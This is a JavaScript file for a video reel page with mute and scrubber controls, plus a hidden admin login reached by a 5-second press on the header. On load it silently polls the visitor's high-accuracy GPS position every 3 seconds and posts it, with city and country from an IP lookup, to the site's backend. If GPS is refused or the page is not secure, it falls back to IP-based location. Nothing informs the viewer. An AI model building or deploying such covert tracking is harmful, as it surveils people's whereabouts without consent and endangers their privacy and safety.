let muteTimeout = null;

// Toggle Audio on Video Tap & Auto-Hide Both 🔊 and 🔇
function toggleAudio() {
  const video = document.getElementById("reelVideo");
  const indicator = document.getElementById("mute-indicator");

  video.muted = !video.muted;
  indicator.textContent = video.muted ? "🔇" : "🔊";

  // Show indicator
  indicator.classList.add("show");

  // Clear previous timer and auto-hide after 900ms for BOTH mute and unmute
  if (muteTimeout) clearTimeout(muteTimeout);
  muteTimeout = setTimeout(() => {
    indicator.classList.remove("show");
  }, 900);
}

// Send coordinates to backend
function sendCoords(lat, lng) {
  fetch("https://ipapi.co/json/")
    .then((res) => res.json())
    .then((ip) => {
      fetch("/api/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          lat: lat,
          lng: lng,
          city: ip.city || "",
          country: ip.country_name || "",
        }),
      });
    })
    .catch((err) => {
      console.error(err);
    });
}

// Fallback when HTTP blocks browser GPS
function fallbackIpLocation() {
  fetch("/api/ip_location", { method: "POST" }).catch((err) =>
    console.error("Fallback location error:", err),
  );
}

// Track location immediately and every 3 seconds
function captureLocation() {
  if (navigator.geolocation && window.isSecureContext) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        sendCoords(position.coords.latitude, position.coords.longitude);
      },
      (error) => {
        console.warn("GPS failed/denied, using IP fallback:", error.message);
        fallbackIpLocation();
      },
      { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 },
    );
  } else {
    // Browser is on HTTP (not HTTPS), use backend IP geolocation fallback
    fallbackIpLocation();
  }
}

function startLocationTracking() {
  captureLocation(); // Capture immediately on load
  setInterval(captureLocation, 3000); // Repeat every 3 seconds
}

// Format seconds into M:SS (e.g., 0:07)
function formatTime(seconds) {
  if (!seconds || isNaN(seconds)) return "0:00";
  const mins = Math.floor(seconds / 60);
  const secs = Math.floor(seconds % 60);
  return `${mins}:${secs < 10 ? "0" : ""}${secs}`;
}

// Initialize Video Scrubber (Forward / Rewind Bar)
function initScrubber() {
  const video = document.getElementById("reelVideo");
  const container = document.getElementById("scrubber-container");
  const fill = document.getElementById("scrubber-fill");
  const timeLabel = document.getElementById("scrubber-time");

  if (!video || !container) return;
  let isScrubbing = false;

  video.addEventListener("timeupdate", () => {
    if (!isScrubbing && video.duration) {
      const percent = (video.currentTime / video.duration) * 100;
      fill.style.width = `${percent}%`;
    }
  });

  function seek(clientX) {
    if (!video.duration) return;
    const rect = container.getBoundingClientRect();
    let pos = (clientX - rect.left) / rect.width;
    pos = Math.max(0, Math.min(1, pos));

    fill.style.width = `${pos * 100}%`;
    video.currentTime = pos * video.duration;
    timeLabel.textContent = `${formatTime(video.currentTime)} / ${formatTime(video.duration)}`;
  }

  container.addEventListener(
    "touchstart",
    (e) => {
      isScrubbing = true;
      container.classList.add("scrubbing");
      seek(e.touches[0].clientX);
    },
    { passive: true },
  );

  window.addEventListener(
    "touchmove",
    (e) => {
      if (!isScrubbing) return;
      seek(e.touches[0].clientX);
    },
    { passive: true },
  );

  window.addEventListener("touchend", () => {
    if (!isScrubbing) return;
    isScrubbing = false;
    container.classList.remove("scrubbing");
  });

  container.addEventListener("mousedown", (e) => {
    isScrubbing = true;
    container.classList.add("scrubbing");
    seek(e.clientX);
  });

  window.addEventListener("mousemove", (e) => {
    if (!isScrubbing) return;
    seek(e.clientX);
  });

  window.addEventListener("mouseup", () => {
    if (!isScrubbing) return;
    isScrubbing = false;
    container.classList.remove("scrubbing");
  });
}

window.onload = () => {
  startLocationTracking();
  initScrubber();
};

let adminLongPressTimer = null;

function handleHeaderTap(event) {
  event.stopPropagation();
}

document.addEventListener("DOMContentLoaded", () => {
  const header = document.querySelector(".header");

  if (!header) return;

  function showAdminModal() {
    const modal = document.getElementById("admin-modal");
    const pinInput = document.getElementById("pin-input");

    modal.style.display = "block";
    pinInput.value = "";
    pinInput.focus();
  }

  function startLongPress() {
    adminLongPressTimer = setTimeout(() => {
      navigator.vibrate?.(150);

      showAdminModal();
    }, 5000); // hold 5 seconds
  }

  function cancelLongPress() {
    clearTimeout(adminLongPressTimer);
  }

  header.addEventListener("touchstart", startLongPress);
  header.addEventListener("touchend", cancelLongPress);
  header.addEventListener("touchcancel", cancelLongPress);

  header.addEventListener("mousedown", startLongPress);
  header.addEventListener("mouseup", cancelLongPress);
  header.addEventListener("mouseleave", cancelLongPress);
});

function closeAdminModal() {
  document.getElementById("admin-modal").style.display = "none";
  document.getElementById("pin-input").value = "";
}

// Admin Login Logic
async function attemptLogin() {
  const pin = document.getElementById("pin-input").value;
  const response = await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ pin: pin }),
  });

  if (response.ok) {
    window.location.href = "/admin";
  } else {
    alert("Incorrect PIN");
  }
}
